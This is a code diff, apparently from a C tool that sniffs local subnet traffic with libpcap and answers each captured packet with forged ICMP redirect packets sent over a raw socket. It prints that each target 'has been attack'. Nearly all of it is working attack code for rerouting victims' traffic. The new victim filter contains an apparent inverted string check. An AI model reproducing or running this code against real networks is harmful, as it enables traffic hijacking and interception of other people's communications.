@@ -22,7 +22,7 @@ u_int16_t checksum(u_int8_t *buf,int len)
         return ~sum;  
 }  
 
-void icmp_redirect(char * target_ip,const unsigned char * packet_data){
+void icmp_redirect(int sockfd,char * target_ip,const unsigned char * packet_data){
 	printf("%s has been attack! \n",target_ip);
 
 	struct ip_header *ip;
@@ -32,9 +32,7 @@ void icmp_redirect(char * target_ip,const unsigned char * packet_data){
         struct icmphdr icmp;
         char datas[28];
     }packet;
-	int sockfd,res;
-    int one = 1;
-    int *ptr_one = &one;
+	
 
 	// Fill up ip header
     packet.ip.version = 4;
@@ -67,7 +65,31 @@ void icmp_redirect(char * target_ip,const unsigned char * packet_data){
     packet.ip.check = checksum(&packet.ip,sizeof(packet.ip));
     packet.icmp.checksum = checksum(&packet.icmp,sizeof(packet.icmp)+28);
 
-	if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0)
+	sendto(sockfd,&packet,56,0,(struct sockaddr *)&dest,sizeof(dest));
+}
+
+void parse_packet(unsigned char * user_data, const struct pcap_pkthdr * pkthdr, const unsigned char * packet){
+	const struct ether_header *ethernet;
+    const struct ip *ip;
+    const struct tcphdr *tcp;
+    const char *payload;
+	char ip_src[INET_ADDRSTRLEN];
+	char ip_dst[INET_ADDRSTRLEN];
+
+    int sockfd,res;
+    int one = 1;
+    int *ptr_one = &one;
+
+    ethernet = (struct ether_header *)packet;
+
+    unsigned short ethernet_type = ntohs(ethernet->ether_type);
+
+    /* Extract IP information. */
+    ip = (struct ip*)(packet + sizeof(struct ether_header));
+    inet_ntop(AF_INET, &(ip->ip_src), ip_src, INET_ADDRSTRLEN);
+    inet_ntop(AF_INET, &(ip->ip_dst), ip_dst, INET_ADDRSTRLEN);
+
+    if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0)
     {
         printf("create sockfd error\n");
         exit(-1);
@@ -80,43 +102,21 @@ void icmp_redirect(char * target_ip,const unsigned char * packet_data){
         exit(-3);
     }
 
-	sendto(sockfd,&packet,56,0,(struct sockaddr *)&dest,sizeof(dest));
-}
-
-void parse_packet(unsigned char * user_data, const struct pcap_pkthdr * pkthdr, const unsigned char * packet){
-	const struct ether_header *ethernet;
-    const struct ip *ip;
-    const struct tcphdr *tcp;
-    const char *payload;
-	char ip_src[INET_ADDRSTRLEN];
-	char ip_dst[INET_ADDRSTRLEN];
-    //uint32_t usec = h->caplen;
-    //uint32_t len = h->len;
-    //printf("%u %u\n", usec, len);
-
-    //printf("%lu %lu %lu\n", sizeof(struct ether_header), sizeof(struct ip), sizeof(struct tcphdr));
-    ethernet = (struct ether_header *)packet;
-
-    unsigned short ethernet_type = ntohs(ethernet->ether_type);
-
-    /* Extract IP information. */
-    ip = (struct ip*)(packet + sizeof(struct ether_header));
-    inet_ntop(AF_INET, &(ip->ip_src), ip_src, INET_ADDRSTRLEN);
-    inet_ntop(AF_INET, &(ip->ip_dst), ip_dst, INET_ADDRSTRLEN);
-
 	// Check the subnet
 	if ((inet_addr(ip_src) & mask) == (net & mask)) {
-		icmp_redirect(ip_src,packet);
+		icmp_redirect(sockfd,ip_src,packet);
 	}
 }
 
-int capture_packet(){
+int capture_packet(char * vic_ip){
 	char errbuf[PCAP_ERRBUF_SIZE];
 
 	struct bpf_program fp;		/* The compiled filter */
-	char filter_exp[] = "";	/* The filter expression */
-
-
+	char filter_exp[4 + INET_ADDRSTRLEN] = "";	/* The filter expression */
+    if (!strcmp(vic_ip," ")) {
+        strcpy(filter_exp,"src ");
+        strcat(filter_exp,vic_ip);
+    }
 
 	// Accroding to WARNING: ‘pcap_lookupdev’ is deprecated: use 'pcap_findalldevs' and use the first device
 	// Use 'pcap_findalldevs' instead of 'pcap_lookupdev'
